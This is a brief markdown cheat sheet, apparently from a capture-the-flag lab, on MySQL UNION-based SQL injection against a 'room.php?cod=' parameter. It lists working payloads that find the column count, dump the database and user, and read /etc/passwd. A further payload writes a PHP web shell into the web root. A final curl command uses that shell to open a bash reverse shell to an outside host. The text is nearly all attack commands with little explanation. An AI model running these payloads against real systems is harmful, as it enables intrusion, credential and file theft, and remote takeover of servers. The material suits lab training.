# MySQL Paramater Injection

## increment order by until the record is not returned 
```
http://10.10.10.143/room.php?cod=1 order by 5
```

## look for injectable columns
```
http://10.10.10.143/room.php?cod=-1 union select 1,2,3,4,5,6,7
```

## get db info
```
$URL -1 union select 1,database(),user(),4,5,6,7
```

## read files
```
$URL -1 union select 1,load_file('/etc/passwd'),3,4,5,6,7
```

## Here's and example of injecting a param (with known number of cols) to execute a shell

```
http://10.10.10.143/room.php?cod=-1 union select 1,'<?php
system($_REQUEST["exec"]);?>',3,4,5,6,7 into outfile '/var/www/html/pwned.php'
```

## Then exploited with

```
curl -X POST http://10.10.10.143/pwned.php --data-urlencode 'exec=bash -c
"bash -i >& /dev/tcp/10.10.14.4/1234 0>&1"'
```
